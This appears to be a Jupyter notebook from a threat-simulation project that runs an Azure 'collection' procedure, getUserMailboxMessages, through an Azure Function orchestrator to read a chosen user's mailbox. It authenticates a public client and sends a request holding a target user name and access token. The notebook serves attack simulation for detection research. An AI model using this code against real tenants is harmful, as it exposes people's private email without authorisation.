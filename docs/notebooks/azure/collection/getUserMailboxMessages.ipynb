{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "11016098",
   "metadata": {},
   "source": [
    "# getUserMailboxMessages"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "82a12e88",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3bcf10aa",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| platform          | Azure |\n",
    "| contributors      | ['Roberto Rodriguez @Cyb3rWard0g', 'Open Threat Research @OTR_Community'] |\n",
    "| creation date     | 2021-08-05 |\n",
    "| modification date | 2021-08-05 |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3dca067d",
   "metadata": {},
   "source": [
    "## Description\n",
    "A threat actor might want to read messages from the mailbox of a specific user.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "93c71945",
   "metadata": {},
   "source": [
    "## Run Simulation"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "232a4cbe",
   "metadata": {},
   "source": [
    "### Authenticate Public Client"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b9e434ac",
   "metadata": {},
   "outputs": [],
   "source": [
    "from msal import PublicClientApplication\n",
    "import requests\n",
    "app = PublicClientApplication(\n",
    "    \"05e7c31e-9970-4594-8857-06fcdb5993b9\",\n",
    "    authority=\"https://login.microsoftonline.com/4b2462a4-bbee-495a-a0e1-f23ae524cc9c\"\n",
    ")\n",
    "result = app.acquire_token_interactive(scopes=['https://socckplay00000000000.azurewebsites.net/user_impersonation'])\n",
    "bearer_token = result['access_token']"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "efbe71c4",
   "metadata": {},
   "source": [
    "### Set Azure Function Orchestrator"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3dd3f61a",
   "metadata": {},
   "outputs": [],
   "source": [
    "endpoint = \"https://socckplay00000000000.azurewebsites.net/api/orchestrators/Orchestrator\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7766f460",
   "metadata": {},
   "source": [
    "### Prepare HTTP Body"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1d22e1d4",
   "metadata": {},
   "outputs": [],
   "source": [
    "data = {'Tactic': 'collection', 'Procedure': 'getUserMailboxMessages', 'parameters': {'userPrincipalName': 'ENTER-VALUE', 'accessToken': 'ENTER-VALUE'}}"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f6e574c3",
   "metadata": {},
   "source": [
    "### Send HTTP Request"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1ecb0509",
   "metadata": {},
   "outputs": [],
   "source": [
    "http_headers = {'Authorization': 'Bearer ' + bearer_token, 'Accept': 'application/json','Content-Type': 'application/json'}\n",
    "results = requests.get(endpoint, json=data, headers=http_headers, stream=False).json()\n",
    "results"
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
